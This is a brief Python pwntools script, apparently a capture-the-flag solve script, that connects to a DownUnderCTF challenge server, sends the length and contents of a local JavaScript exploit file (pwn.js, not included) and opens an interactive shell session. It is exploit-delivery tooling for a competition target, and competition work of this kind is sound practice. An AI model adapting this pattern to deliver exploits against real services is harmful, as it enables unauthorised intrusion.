from pwn import *

io = remote("chal.duc.tf", 30004)

exploit = open("pwn.js", "rb").read()

io.sendline(f"{len(exploit)}")
io.sendline(exploit)

io.interactive()

